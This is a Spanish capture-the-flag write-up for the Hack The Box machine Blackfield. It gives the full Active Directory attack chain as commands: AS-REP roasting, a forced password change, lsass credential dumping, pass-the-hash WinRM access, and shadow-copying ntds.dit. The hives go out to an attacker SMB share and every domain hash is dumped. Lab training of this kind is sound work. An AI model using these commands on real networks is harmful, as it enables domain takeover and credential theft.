@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Blackfield HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/blackfield/pasted-image-20260304005159.png" alt="Blackfield HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Blackfield</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>AS-REP Roasting</span>
+            <span>backup_operators</span>
+            <span>ntds</span>
+            <span>lsass</span>
+            <span>backup</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Usuarios vía <code>SMB</code> anónimo y <code>RID Brute</code></li>
+            <li><code>Explotación</code>: <code>AS-REP Roasting</code></li>
+            <li><code>Movimiento lateral</code>: <code>support</code> abusa de <code>ForceChangePassword</code> sobre <code>audit2020</code></li>
+            <li><code>Movimiento lateral</code>: Share forense con volcado <code>lsass.DMP</code></li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>Grupo <code>Backup Operators</code></code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/blackfield/pasted-image-20260304005243.png" alt="Blackfield HTB" />
+          <div class="code-card">
+            <h3>Lista usuarios</h3>
+            <pre><code>nxc smb dc01 -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: AS-REP Roasting</h2>
+          <div class="code-card">
+            <h3>AS-REP Roasting</h3>
+            <pre><code>impacket-GetNPUsers blackfield.local/support -no-pass
+# Credenciales -&gt; support:#00^BlackKnight</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/blackfield/pasted-image-20260304005607.png" alt="Blackfield HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: support ForceChangePassword audit2020</h2>
+          <img class="writeup-image" src="/writeups/assets/blackfield/pasted-image-20260304015537.png" alt="Blackfield HTB" />
+          <div class="code-card">
+            <h3>ForceChangePassword</h3>
+            <pre><code>nxc smb dc01 -u &#x27;support&#x27; -p &#x27;#00^BlackKnight&#x27; -M change-password -o USER=audit2020 NEWPASS=&#x27;audit2020&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Share con lsass.DMP</h2>
+          <img class="writeup-image" src="/writeups/assets/blackfield/pasted-image-20260304015923.png" alt="Blackfield HTB" />
+          <div class="code-card">
+            <h3>Dumpear Share Forensic</h3>
+            <pre><code>smbclient //dc01/forensic -U audit2020%audit2020 -c &quot;recurse; prompt; mget *;&quot;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Descomprimir lsass.zip con lsass.DMP</h3>
+            <pre><code>7z x lsass.zip</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Dumpear lsass.DMP</h3>
+            <pre><code>pypykatz lsa minidump lsass.DMP
+# svc_backup:9658d1d1dcd9250115e2205d9f48400d</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/blackfield/pasted-image-20260304021255.png" alt="Blackfield HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i dc01 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo Grupo <code>Backup Operators</code></h2>
+          <div class="code-card">
+            <h3>Shadow.txt -&gt; Añadir un espacio al final de cada linea</h3>
+            <pre><code>set context persistent nowriters 
+add volume c: alias unidad 
+create 
+expose %unidad% z: </code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Lanzar diskshadow desde un fichero</h3>
+            <pre><code>diskshadow.exe /s c:\Temp\shadow.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/blackfield/pasted-image-20260304025808.png" alt="Blackfield HTB" />
+          <div class="code-card">
+            <h3>Recuperar el fichero ntds.dit que se encuentra en originalmente en c:\Windows\NTDS\ desde z:\Windows\NTDS\</h3>
+            <pre><code>robocopy /b z:\Windows\NTDS\ . ntds.dit</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Transferir archivo con SMB</h3>
+            <pre><code># Kali
+impacket-smbserver recurso $(pwd) -smb2support
+# Windows
+copy ntds.dit //10.10.16.130/recurso/
+reg.exe save hklm\system \\10.10.16.130\recurso\SYSTEM.save</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Kali: Dumpear ntds.dit</h3>
+            <pre><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL
+# Obtenemos todos los hashes del dominio
+# Administrator -&gt; aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>AS-REP Roasting</span>
+            <span>backup_operators</span>
+            <span>ntds</span>
+            <span>lsass</span>
+            <span>backup</span>
+            <span>robocopy</span>
+            <span>diskshadow</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
